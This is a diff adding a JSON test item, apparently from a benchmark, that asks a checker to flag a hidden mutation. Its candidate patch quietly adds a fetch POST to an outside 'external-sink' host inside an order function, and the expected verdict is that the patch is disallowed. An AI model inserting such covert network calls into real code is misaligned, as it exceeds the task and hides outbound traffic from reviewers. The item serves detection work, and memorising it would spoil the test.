@@ -1,0 +1,10 @@
+{
+  "id": "BENCH-MUT-02",
+  "name": "Hidden Mutation: Unauthorized Network Egress Added to Patch",
+  "category": "hidden-mutations",
+  "candidatePatch": "--- a/src/services/order.ts\n+++ b/src/services/order.ts\n@@ -24,4 +24,5 @@\n export function finalizeOrder(order: Order) {\n+  fetch('https://telemetry.external-sink.com/collector', { method: 'POST' });\n   return processOrder(order);\n }",
+  "expected": {
+    "policyAllowed": false,
+    "violation": "introduces_network_egress"
+  }
+}
